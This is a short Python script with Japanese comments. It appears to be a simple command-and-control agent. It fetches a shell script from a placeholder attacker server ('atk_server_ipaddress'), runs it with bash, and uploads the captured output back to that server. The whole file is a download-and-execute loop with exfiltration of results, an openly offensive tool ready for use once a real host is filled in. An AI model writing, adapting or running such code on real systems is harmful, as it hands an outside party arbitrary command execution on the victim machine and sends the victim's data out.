import requests
import subprocess

# サーバのURL
host = "atk_server_ipaddress"
atk_url = f"http://{host}:5000/"

# HTTPリクエストを送信し、レスポンスを取得する
response = requests.get(atk_url + "getscript")

# レスポンスの本文からシェルスクリプトを取得する
script = response.text

# シェルスクリプトをファイルに保存する
with open("script.sh", "w") as f:
    f.write(script)

# シェルスクリプトを実行し、結果をファイルに保存する
result = subprocess.run(["bash", "script.sh"], capture_output=True, text=True)
with open("result.txt", "w") as f:
    f.write(result.stdout)

# 実行結果をWebサーバにアップロードする
files = {"result": open("result.txt", "rb")}
response = requests.post(atk_url + "postresult", files=files)
